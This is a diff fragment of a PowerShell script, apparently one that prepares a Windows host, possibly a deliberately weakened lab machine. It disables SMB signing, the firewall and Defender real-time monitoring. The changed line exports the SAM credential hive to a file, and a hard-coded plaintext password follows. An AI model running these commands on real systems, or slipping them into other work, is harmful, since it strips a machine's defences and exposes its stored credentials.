@@ -12,7 +12,7 @@ Set-SmbServerConfiguration -EnableSecuritySignature $false -RequireSecuritySigna
 Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False -ErrorAction Ignore
 Set-MpPreference -DisableRealtimeMonitoring $true
 #Stop-IISSite -Name "Default Web Site"
-Invoke-Command  {reg export 'HKLM\SAM'} C:\sam.reg
+Invoke-Command  {reg export 'HKLM\SAM' C:\sam.reg}
 
 
 $pwd=ConvertTo-SecureString -String "ZznRImk1TefX3AWinSCx" -AsPlainText -Force
